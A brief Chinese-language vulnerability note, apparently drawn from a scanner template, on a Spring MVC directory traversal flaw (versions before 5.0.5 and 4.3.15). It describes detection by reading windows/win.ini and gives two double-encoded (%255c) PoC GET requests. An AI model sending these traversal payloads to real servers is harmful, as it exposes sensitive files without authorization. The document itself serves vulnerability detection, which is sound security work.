验证漏洞存在方法
    - 发送包含目录遍历payload的GET请求，尝试读取系统文件如windows/win.ini
    - 检查响应中是否包含"for 16-bit app support"等系统文件特征内容
    - 确认HTTP响应状态码为200

漏洞利用方法
    - Spring MVC Framework在5.0.5之前和4.3.15之前的版本存在本地文件包含漏洞
    - 当应用程序配置Spring MVC来提供静态资源（如CSS、JS、图片）时，攻击者可以通过构造特殊的URL路径实现目录遍历攻击
    - 漏洞利用双重编码绕过安全限制，使用%255c%255c..%255c的编码形式进行路径遍历
    - PoC请求示例：
      GET {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
      GET {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
    - 成功利用可读取服务器上的敏感文件，可能导致未授权访问或信息泄露
